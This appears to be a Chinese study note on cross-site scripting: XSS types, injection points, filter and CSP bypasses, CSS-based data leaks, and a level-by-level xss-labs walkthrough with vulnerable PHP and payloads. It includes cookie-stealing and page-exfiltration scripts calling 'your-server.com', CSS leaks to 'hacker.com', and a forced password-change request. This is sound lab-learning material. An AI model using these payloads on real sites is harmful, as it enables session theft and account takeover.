# XSS

攻击者往web页面插入恶意的Script代码，当用户浏览此页时嵌入到web页面的script代码就会被执行，一般不会威胁到后台

### 三大类型

1.存储型XSS（永久）

恶意代码存到服务器**数据库**，所有人访问都触发，危害最大。

场景：评论、留言、昵称、发帖。

2.反射型XSS（临时）（页面一刷新就没有了）

不存服务器，靠**恶意 URL 链接**诱导用户点击，一次性触发。通过邮件等形式把包含XSS代码发送给正常用户

是用户的页面响应了XSS代码

场景：搜索栏、页面跳转

3.DOM型XSS

### 如何确定这是XSS漏洞（**有输入且输入内容能出现在最终HTML中，优先考虑XSS**）

#### 输入点

1. URL参数

2. POST表单：搜索框，留言板，修改个人资料（昵称，签名，头像URL）

3. HTTP Header

   ```php
   User-Agent: <script>alert(1)</script>
   Referer: "><script>alert(1)</script>
   X-Forwarded-For: 1.1.1.1'"></script> #XFF(当你的网络请求经过了代理服务器或负载均衡器时，用来记录并传递你最初的真实 IP 地址)
   Cookie: session=<script>alert(1)</script>
   ```

4. 文件上传

   文件名：<script>alert(1)</script>.jpg

   文件内容：SVG、HTML、PDF中的XSS

   图片的属性：详细信心，EXIF元数据

5. JSONP回调（我对于这个了解不深）

   ```text
   http://challenge.com/api?callback=<img src=x onerror=alert(1)>
   ```

在所有可疑输入点上进行\<img src=x onerror=console.log(1)>这样有输出的校验

#### 输出点

##### 可能存在的位置：

1. HTML标签之间	<div>你的输入</div>
2. HTML属性值内        input value="你的输入">（XSS-labs大多数是这样）需要闭合引号
3. script标签内           <script>var x="你的输入"</script>需要闭合字符串   可以输入**";alert(1)**
4. CSS内                       style="background:你的输入"     可以输入**red; color: blue"**

#### 攻击方式

1. 弹窗证明

   ```javascript
   alert(1)
   confirm(1)
   prompt(1)
   throw onerror=alert(1)
   ```

2. 盗取管理员Cookie（存储型XSS打Admin）

   ```javascript
   <script>
   fetch('http://your-server.com/steal?c='+document.cookie)
   </script>
   ```

3. 越权操作（如强制发帖/改密码）

   ```javascript
   <script>
   fetch('/change_password', {
       method:'POST',
       body:'newpass=123456'
   })
   </script>
   ```

4. 读flag

   ```javascript
   <script>
   fetch('/')
     .then(r=>r.text())
     .then(html=>fetch('http://your-server.com?data='+btoa(html)))
   </script>
   ```

#### 绕过方式

1. 标签绕过

   大小写混写，双写关键字，自定义标签

   ```html
   #自定义标签示例
   <xyz onmouseover=alert(1)>hover
   ```

2. 事件注入：" onmouseover="alert(1)

3. 伪协议：javascript:alert(1)

4. 编码绕过：%3Cscript%3Ealert(1)%3C/script%3E

   HTML实体（事件中可用）	URL编码（URL参数中）	Unicode（JS字符串内）

   Hex（JS字符串内）	Octal（JS字符串内）	Base64（需要eval）

   

5. 长度限制：使用短标签：<svg/onload=alert(1)>   // 20字符

   外链远程脚本：<script src="//短链接"></script>

   利用location.hash：eval(location.hash.slice(1))

##### 补充location.hash的用法

location.hash` 获取 URL 中 `#`后面的内容，它的好处是可以很长，可以用特殊字符

```php
<body onload="eval(location.hash.slice(1))">
#然后访问http://example.com/page#alert(1)
```

#### 绕过流程

```text
输入测试Payload：<script>alert(1)</script>
   不弹窗？查看源码
        │
        ├── 看到完整的<script>标签被保留
        │   └── 可能被CSP拦截 → 进入CSP绕过
        │
        ├── 看到<变成了&lt;（被转义）
        │   └── 转义发生在哪里？
        │       ├── 在HTML标签内 → 换事件注入
        │       ├── 在属性值内 → 先闭合引号
        │       └── 在script内 → 闭合字符串
        ├── 看到删掉了部分字符（如scr被删）
        │   └── 双写：<scrscriptipt>
        ├── 看到完全变空白
        │   └── 换其他标签：<img src=x onerror=alert(1)>
        └── 看到长度被截断
            └── 用短Payload + 外链或者利用location.hash
```

### CSP

CSP 是一个 HTTP 响应头，告诉浏览器：只允许加载特定来源的资源，**禁止执行内联脚本**。

```text
Content-Security-Policy: script-src 'self'
```

#### 怎么看CSP策略

1. 查看HTTP响应头

2. 查看meta标签

   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
   ```

| `script-src`  | 控制 JavaScript                  | `script-src 'self'`  |
| ------------- | -------------------------------- | -------------------- |
| `style-src`   | 控制 CSS                         | `style-src 'self'`   |
| `img-src`     | 控制图片                         | `img-src *`          |
| `connect-src` | 控制 AJAX/fetch                  | `connect-src 'self'` |
| `font-src`    | 控制字体                         | `font-src 'self'`    |
| `frame-src`   | 控制 iframe                      | `frame-src 'none'`   |
| `default-src` | 默认策略（其他指令未设置时继承） | `default-src 'self'` |

| 关键字            | 含义                                     | 安全性     |
| :---------------- | :--------------------------------------- | :--------- |
| `'none'`          | 什么都不允许                             | 最安全     |
| `'self'`          | 只允许同源（相同域名、协议、端口）       | 安全       |
| `'unsafe-inline'` | 允许内联脚本（`<script>`、`onclick` 等） | 不安全     |
| `'unsafe-eval'`   | 允许 `eval()`、`setTimeout('字符串')` 等 | 不安全     |
| `https:`          | 允许所有 HTTPS 源                        | 中等       |
| `*`               | 允许所有源                               | 不安全     |
| `data:`           | 允许 data: URI                           | 可能有风险 |

#### 目前还没有做过这样的题目

| 置错误                   | 后果                 | 利用方式                                       |
| :----------------------- | :------------------- | :--------------------------------------------- |
| 设置了 `'unsafe-inline'` | 内联脚本可用         | 直接 `<script>`                                |
| 设置了 `'unsafe-eval'`   | eval 可用            | `eval(location.hash)`                          |
| 白名单域名过宽           | 可加载恶意脚本       | `*` 或 `https:`                                |
| 缺少 `base-uri`          | 可劫持相对路径       | `<base href="https://evil.com">`               |
| 缺少 `object-src`        | 可能加载 Flash       | `<object>`（已基本失效）                       |
| 允许 `data:`             | 可 data URI 加载脚本 | `<script src="data:text/javascript,alert(1)">` |

#### 补充CSS构造

CSS 不会直接执行 JavaScript，如果你在 style="background:你的输入"` 中直接输入 `;alert(1)`，最终 HTML 会变成 `style="background:;alert(1)"。浏览器会认为 `alert(1)` 只是一个它看不懂的 CSS 属性，直接忽略掉，**绝对不会弹窗**。因为 CSS 引擎和 JavaScript 引擎是两套完全不同的系统。

关键：**跳出 CSS 解析、进入 JS 执行**

1. **利用 `url()` 和 `javascript:` 伪协议**：style="background:url(javascript:alert(1))"
2. **利用 IE 浏览器特有的 `expression()` 表达式**：style="background:red; expression(alert(1))

#### 前两条只针对于“古老的”浏览器

##### CSS注入主要是为了偷数据，而不是弹窗

##### 属性选择器

利用 CSS 的属性选择器（如 `[value^="a"]` 表示匹配 value 值以 "a" 开头的元素），配合 `background-image: url(...)`。

```css
//假设页面上有一个隐藏的密码框：<input type="hidden" id="pwd" value="s3cret">。
/* 如果密码以 a 开头，就加载 a.png */
#pwd[value^="a"] { background: url(https://hacker.com/log?char=a); }
/* 如果密码以 b 开头，就加载 b.png */
#pwd[value^="b"] { background: url(https://hacker.com/log?char=b); }
/* ...以此类推，穷举 a-z, 0-9 */
```

##### 字体加载窃取

利用 CSS 的 `@font-face` 规则，为特定的字符（如 Unicode 编码）指定一个外部字体文件。当浏览器渲染页面时，如果遇到这个字符，就会去下载对应的字体文件。

```css
//假设页面上有一段敏感文字：<div id="secret">MyPassword123</div>。
@font-face {
    font-family: 'leak';
    src: url('https://hacker.com/log?char=M');
    unicode-range: U+004D; /* 字母 M 的 Unicode 编码 */
}
@font-face {
    font-family: 'leak';
    src: url('https://hacker.com/log?char=y');
    unicode-range: U+0079; /* 字母 y 的 Unicode 编码 */
}
/* ...为所有可能的字符配置对应的字体 */

#secret { font-family: 'leak'; } /* 强制敏感文字使用这套“偷数据字体” */
```

##### 内联样式与条件判断

`attr()` 函数（**把 HTML 标签里某个属性的值，直接拿到 CSS 里面来用**）以及条件判断（如 `if()` 语句）

```html
#假设攻击者能控制某个 div 的 style 属性，且该 div 有一个敏感属性 data-uid="123"。
#这仅在部分浏览器中生效
<div style='
    --val: attr(data-uid); 
    --steal: if(style(--val:"123"): url(https://hacker.com/got_it); else: url(https://hacker.com/nope));
    background: image-set(var(--steal))
' data-uid="123"></div>
```



### XSS基础代码

> <script>alert(‘XSS’)</script>    弹窗测试（仅验证漏洞存在）
>
> <img src=x onerror =alert(‘XSS’)>   无scirpt标签的XSS（绕过简单过滤），图片加载失败触发`onerror`执行脚本
>
> ```html
> <svg onload=alert(1)>       #svg 标签 onload
> <a href=javascript:alert(1)>click</a>  #a 标签伪协议
> <input onfocus=alert(1) autofocus>   #input 事件触发
> <img src=x onerror =alert(‘XSS’)>   #无scirpt标签的XSS（绕过简单过滤），图片加载失败触发`onerror`执行脚本
> <svg onload=alert(1)>
> <input onfocus=alert(1) autofocus>
> #时间属性
> " onmouseover="alert(1)
> ' onclick='alert(1)
> ```
>
> ```html
> <SCRIPT>alert(1)</SCRIPT>   
> <ImG src=x OnErRoR=alert(1)>     #大小写绕过
> <scrscriptipt>alert(1)</scrscriptipt>   #双写绕过，把 script 替换为空，双写拼接还原
> %3Cscript%3Ealert(1)%3C/script%3E   #编码绕过，这里是URL编码
> ```
>



# xss-labs（http://test.ctf8.com/）

找注入点，闭合方式，将可控输入语句“踢”到外面去

用“检查”（F12）来看过滤的内容，属性与字符串（用颜色区分）

**修改 Payload**:用不触发浏览器过滤器的方式：http://test.ctf8.com/level1.php?name=<img src=x onerror=alert(1)>

浏览器会拦截http://test.ctf8.com/level1.php?name=<script>alert(`1`)</script>

onclick=alert(1)

onfocus=alert(1)#无限弹窗

```php
// 常见示例
$keyword = str_replace("'", "", $_GET['keyword']); // 过滤单引号
// 或
$keyword = preg_replace("/script/i", "", $_GET['keyword']); // 过滤script关键词
// 或
$keyword = htmlspecialchars($_GET['keyword'], ENT_QUOTES); // 转义所有引号和尖括号
```

html实体转义默认用‘, 单引号默认不转义

```php
$str = $_GET["keyword"];
echo "<input name=keyword value='".htmlspecialchars($str)."'>";#这样写默认不转义单引号
echo "<input name=keyword value='".htmlspecialchars($str, ENT_QUOTES)."'>";#这样单引号也会被当作字符串
```

### Less-4：**仅过滤尖括号但未处理事件属性**

可以用“ onclick=alert(1) ”

```php
$str2 = str_replace(">", "", $str);  // 直接删除">"字符
$str3 = str_replace("<", "", $str2);  // 直接删除"<"字符
```

### Less-5：JS的伪协议

**同时过滤了 `<script>` 标签和 `on` 事件属性，但未限制其他 HTML 标签的 JavaScript 伪协议调用**

```php
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);       // 1. 全部转为小写（防止大小写绕过）
$str2 = str_replace("<script", "<scr_ipt", $str);  // 2. 替换 "<script" → "<scr_ipt"
$str3 = str_replace("on", "o_n", $str2);  // 3. 替换所有 "on" → "o_n"（破坏事件属性）
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".
     '<center>
        <form action=level5.php method=GET>
            <input name=keyword value="'.$str3.'">  // 关键：未对 $str3 做完整转义
            <input type=submit name=submit value=搜索 />
        </form>
     </center>';
?>
```

```php
#有效Payload
"><a href=javascript:alert(1)>Click Here</a>#双引号是闭合方式，而尖括号是为了闭合<input>标签
```

#### 验证闭合方式

用test “

![image-20260519092120974](./assets/image-20260519092120974.png)

用test ‘

![image-20260519092211500](./assets/image-20260519092211500.png)

这里发现单引号当作了字符串，而双引号被“踢”出。

#### JS伪协议

**伪协议定义**：
`javascript:` 是一种**浏览器内置的指令式 URI 方案**，当浏览器解析到以 `javascript:` 开头的 URI 时，会**忽略常规的网络请求流程**，转而将后续内容视为 JavaScript 代码执行。

JavaScript 伪协议（`javascript:`）**本质是浏览器执行内联脚本的快捷方式**，因其能绕过基础过滤而成为 XSS 攻击的常用载体

```pjp
#支持伪协议的标签
<a href="javascript:alert('触发XSS')">点击测试</a>
<iframe src="javascript:console.log('iframe执行')"></iframe>
<form action="javascript:submitForm()"></form>
```

### Less-6:**大小写敏感**

码中**没有**像第五关那样使用 `strtolower()` 将输入强制转为小写。

```php
<?php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2 = str_replace("<script", "<scr_ipt", $str);  // 过滤 <script
$str2 = str_replace("on", "o_n", $str2);          // 过滤 on (事件属性)
$str2 = str_replace("src", "sr_c", $str2);        // 过滤 src (如 <img src=...)
$str2 = str_replace("data", "da_ta", $str2);      // 过滤 data (如 <iframe data=...)
$str2 = str_replace("href", "hr_ef", $str2);      // 过滤 href (如 <a href=...)
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".
     '<center>
        <form action=level6.php method=GET>
            <input name=keyword value="'.$str2.'">  // 依然没有对 $str2 进行引号转义
            <input type=submit name=submit value=搜索 />
        </form>
     </center>';
?>
```

这里的str_replace是区分大小写的

### Less-7:双写绕过

```php
$str=strolower($_GET["keyword"]);//转换为小写
// 核心过滤逻辑
$str1 = str_ireplace("script", "", $str1);
$str1 = str_ireplace("on", "", $str1);
$str1 = str_ireplace("src", "", $str1);
$str1 = str_ireplace("data", "", $str1);
$str1 = str_ireplace("href", "", $str1);
```

**致命弱点：只执行了一次替换，并且这里换为了空（“”）**

- 代码并没有使用循环（`while`）或递归。
- 这意味着：如果你输入 `oonn`，代码删掉中间的 `on` 后，剩下的 `o` 和 `n` 会拼接成新的 `on`，但代码**不会再检查第二遍**。

### Less-8：href标签

```php
// 核心过滤逻辑
$str1 = str_ireplace("javascript", "", $str1); // 过滤 javascript
$str1 = str_ireplace(" ", "", $str1);          // 过滤空格
$str1 = str_ireplace('"', """, $str1);         // 过滤双引号
$str1 = str_ireplace("'", "&#39", $str1);      // 过滤单引号
$str1 = str_ireplace(">", "&gt", $str1);       // 过滤 >
$str1 = str_ireplace("<", "&lt", $str1);       // 过滤 <
$str1 = str_ireplace("&", "&amp", $str1);      // 过滤 & (关键！)

echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".
     '<center><a id="href" href="'.$str1.'">友情链接</a></center>'; // 输出点在 href 中
?>
```

```PHP
#可以用HTML实体编码
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert
#也可以用Unicode编码
&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029
```

### Less-9： 内容检测（http://）

```php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
}
```

明文：javascript:alert(1)//http://（对其中的字母进行加密）

### Less-10:隐藏输入框，修改HTML属性（GET）

![image-20260519175104233](./assets/image-20260519175104233.png)

![image-20260519175037650](./assets/image-20260519175037650.png)

通过尝试了方法找注入点：http://test.ctf8.com/level10.php?keyword=well%20d&t_link=123&t_history=362&t_sort=321

![image-20260519175203510](./assets/image-20260519175203510.png)

`"` onfocus="alert(1)" autofocus type="text

autofocus是自动触发

### Less-11：**HTTP Referer 型 XSS**

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11 = $_SERVER['HTTP_REFERER'];           // 获取Referer请求头
$str22 = str_replace(">", "", $str11);       // 过滤 > 符号
$str33 = str_replace("<", "", $str22);       // 过滤 < 符号

// 输出到隐藏表单
<input name="t_ref" value="'.$str33.'" type="hidden">
```

- 删除 `>` 符号
- 删除 `<` 符号
- **没有过滤双引号 `"`、单引号 `'`、事件关键字（如 `onclick`）**

```
" type="text" onclick="alert(1)   #可以用HackBar来修改Referer，或者用BurpSuit来拦截
```

过滤不完全，有返回给浏览器参数

### Less-12：**User-Agent型XSS**

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11 = $_SERVER['HTTP_USER_AGENT'];          // 获取User-Agent请求头
$str22 = str_replace(">", "", $str11);         // 过滤 > 符号
$str33 = str_replace("<", "", $str22);         // 过滤 < 符号

// 输出到隐藏表单
<input name="t_ua" value="'.$str33.'" type="hidden">
```

### Less-13:**Cookie型XSS**

```php
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11 = $_COOKIE['user'];                    // 获取Cookie中的user值
$str22 = str_replace(">", "", $str11);        // 过滤 > 符号
$str33 = str_replace("<", "", $str22);        // 过滤 < 符号

// 输出到隐藏表单
<input name="t_cook" value="'.$str33.'" type="hidden">
```

### Less-14：**上传一张图片，然后服务器会读取并展示这张图片的 EXIF 信息**

这里由于github这里的连接有问题，没有显示“上传文件”

```php
#第十四关的页面通过 <iframe> 加载了一个图片上传处理页面 exifviewer.php
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="exifviewer.php" frameborder=no width="80%" scrolling="no" height=80%></iframe></center>

// 读取EXIF信息
$exif = exif_read_data($targetPath, 0, true);
if ($exif !== false) {
    echo "<h4>[" . basename($_FILES["file"]["name"]) . "]的EXIF信息:</h4>";
    foreach ($exif as $key => $section) {
        foreach ($section as $name => $val) {
            echo "$key.$name: $val<br />\n";   // 直接输出 EXIF 值
        }
    }
}
```

在任意一张图片的属性的详细信息（在某个字段（如“作者”、“标题”、“备注”）中）输入

>  <script>alert(1)</script>

**EXIF**（Exchangeable Image File Format）是嵌入在图片文件中的一段元数据，可以理解为照片的**“电子身份证”**或**“拍摄日志”**。

### Less-15： **`ng-include` 文件包含**

需要同域下的php代码， **`ng-include` 文件包含**

```php
<span class="ng-include:<?php echo htmlspecialchars($_GET['src']); ?>"></span>
```

1. `src` 参数的值会被拼接到 `ng-include:` 后面

不能使用<script>

`ng-include` 加载外部 HTML 文件时，**`<script>` 标签中的内容不会执行**。但 `<a>`、`<img>` 等 HTML 标签和事件可以正常触发。

```php
#?src='level1.php?name=<img src=x onerror=alert(1)>'
?src=%27level1.php?name=%3Cimg%20src=x%20onerror=alert(1)%3E%27
```

### Less-16:

```php
<?php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2 = str_replace("script", " ", $str);
$str3 = str_replace(" ", " ", $str2);
$str4 = str_replace("/", " ", $str3);
$str5 = str_replace(" ", " ", $str4);
echo "<center>" . $str5 . "</center>";
?>
```

被过滤的部分替换成 ` `(空格实体)

HTML 标签的属性之间可以用**回车（换行符）**来分隔。回车在 URL 编码中是 **`%0a`**（大小写均可，`%0A` 也一样）

### Less-17：<embed>标签

```PHP
echo "<embed src=xsf01.swf?" . htmlspecialchars($_GET["arg01"]) . "=" . htmlspecialchars($_GET["arg02"]) . " ...>";
```

1. 虽然使用了 `htmlspecialchars()` 转义了 `<` `>` `"` `'`，但**空格没有被转义**
2. `<embed>` 标签支持事件属性（如 `onmouseover`）
3. 两个参数拼接后：`xsf01.swf?arg01的值=arg02的值`
4. 攻击者可以在 `arg02` 中**先输入参数值，再用空格隔开，添加事件属性**

`xsf01.swf` 在这里主要是一个**攻击目标载体**，它的实际内容（是否加载成功）并不重要，关键在于你可以通过修改它的参数，来操作包裹它的 `<embed>` 标签，从而实现 XSS 攻击

最终的 `<embed>` 标签只有一个，事件属性也只需要一个。

```
?arg01=test&arg02=123 onmouseover=alert(1)
```

这里我没有用这个显示出跳转的页面（不知道是为什么）

### Less-18：<embed>标签

```php
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?" . htmlspecialchars($_GET["arg01"]) . "=" . htmlspecialchars($_GET["arg02"]) . " width=100% heigth=100%>";
?>
```

- Flash 文件从 `xsf01.swf` 换成了 `xsf02.swf`
- 其他防御机制（过滤方式、参数结构）完全相同

> ?arg01=a&arg02=b onmouseover=alert(1)

### Less-19：**Flash XSS**

- Flash 文件从 `xsf02.swf` 换成了 `xsf03.swf`
- 仍然是两个参数 `arg01` 和 `arg02`
- `htmlspecialchars()` 仍然会转义 `<` `>` `"` `'`

```php
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
```

- Flash 文件从 `xsf02.swf` 换成了 `xsf03.swf`
- 仍然是两个参数 `arg01` 和 `arg02`
- `htmlspecialchars()` 仍然会转义 `<` `>` `"` `'`

```php
http://test.ctf8.com/level19.php?arg01=version&arg02=<a href="javascript:alert(1)">xss</a>
```

因为 **Flash 技术已经被淘汰了**。从 2021 年起，所有主流浏览器（Chrome、Edge、Firefox 等）都**默认禁用**了 Flash 插件。**如果不开启**：浏览器根本无法运行 `xsf03.swf` 这个 Flash 文件。

视频网站逐渐从 Flash 转向 HTML5

### Less-20：Flash XSS

```php
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?' . htmlspecialchars($_GET["arg01"]) . "=" . htmlspecialchars($_GET["arg02"]) . '" width=100% heigth=100%>';
?>
```

- Flash 文件从 `xsf03.swf` 换成了 `xsf04.swf`
- 两个参数 `arg01` 和 `arg02`
- 双引号被 `htmlspecialchars()` 转义成 `"`，无法直接闭合

第二十关的 `xsf04.swf` 经过了代码混淆，不能直接用 HTML 注入的方式。需要先下载 `.swf` 文件，用 **JPEXS Flash 反编译器**分析漏洞点，找到可注入的参数和位置。

> ```
> ?arg01=id&arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height
> ```

